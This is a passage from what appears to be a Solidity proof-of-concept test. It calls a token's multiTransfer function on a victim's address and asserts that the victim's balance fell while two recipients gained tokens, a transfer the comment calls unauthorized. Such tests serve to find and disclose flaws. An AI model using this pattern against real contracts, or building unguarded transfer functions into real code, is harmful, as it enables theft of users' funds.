        token.multiTransfer(victim, recipients, amounts);

        // Verify balances after unauthorized transfer
        assertEq(token.balanceOf(victim), initialVictimBalance - totalTaken, "Victim balance incorrect");
        assertEq(token.balanceOf(recipient1), amounts[0], "Recipient1 balance incorrect");
        assertEq(token.balanceOf(recipient2), amounts[1], "Recipient2 balance incorrect");
    }
}
